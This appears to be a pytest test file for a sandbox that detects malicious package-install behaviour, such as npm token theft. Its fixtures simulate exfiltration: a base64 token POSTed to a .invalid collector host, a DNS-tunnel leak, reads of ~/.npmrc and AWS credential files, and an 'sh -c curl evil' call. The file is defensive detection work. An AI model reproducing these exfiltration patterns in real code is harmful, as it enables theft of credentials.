import base64

from bawabu_sandbox import evidence, honeypots


def _b64(s: str) -> str:
    return base64.b64encode(s.encode()).decode()


def test_canary_leak_base64_is_exfiltration():
    """The token-stealer fixture reads ~/.npmrc and POSTs it base64-encoded to a .invalid host."""
    strace = '7 openat(AT_FDCWD, "/root/.npmrc", O_RDONLY) = 3\n'
    leaked = _b64(f"//registry.npmjs.org/:_authToken={honeypots.NPM_TOKEN}\n")
    sink = [
        {"kind": "dns", "name": "collector.bawabu-test.invalid", "qtype": "A"},
        {"kind": "http", "scheme": "https", "host": "collector.bawabu-test.invalid",
         "method": "POST", "path": "/collect", "headers": {}, "body_text": leaked},
    ]
    ev = evidence.build(strace, sink, duration_s=3.2)
    assert ev.exfiltration
    assert any("npm token" in c for c in ev.canaries_leaked)
    # npm reads .npmrc itself, so an .npmrc read is not reported as a signal — the leak is.
    assert ev.secret_reads == []
    assert ev.network[0].canaries  # the POST is flagged
    assert "Exfiltration confirmed" in ev.summary()


def test_legit_binary_download_not_flagged():
    """esbuild-style installer fetches from the registry: network, but no secret and no canary."""
    strace = '7 openat(AT_FDCWD, "/work/project/node_modules/.bin/x", O_RDONLY) = 3\n'
    sink = [
        {"kind": "dns", "name": "registry.npmjs.org", "qtype": "A"},
        {"kind": "http", "scheme": "https", "host": "registry.npmjs.org",
         "method": "GET", "path": "/fastbundle-bin/-/placeholder", "headers": {}, "body_text": ""},
    ]
    ev = evidence.build(strace, sink, duration_s=1.5)
    assert not ev.exfiltration
    assert ev.secret_reads == []
    assert ev.network[0].benign_destination
    assert "No secret reads or unknown network contact" in ev.summary()


def test_secret_read_without_leak():
    strace = '7 openat(AT_FDCWD, "/root/.aws/credentials", O_RDONLY) = 3\n'
    ev = evidence.build(strace, [], duration_s=0.8)
    assert not ev.exfiltration
    assert "/root/.aws/credentials" in ev.secret_reads
    assert "no outbound leak" in ev.summary()


def test_dns_tunnel_canary_is_leak():
    name = f"{honeypots.ENV_SECRET}.exfil.bad.invalid"
    ev = evidence.build("", [{"kind": "dns", "name": name, "qtype": "A"}], duration_s=0.5)
    assert ev.exfiltration
    assert any("project secret" in c for c in ev.canaries_leaked)


def test_notable_process_captured():
    strace = '7 execve("/bin/sh", ["sh", "-c", "curl evil"], 0x0) = 0\n'
    ev = evidence.build(strace, [], duration_s=0.3)
    assert any("sh -c curl evil" in p for p in ev.processes)
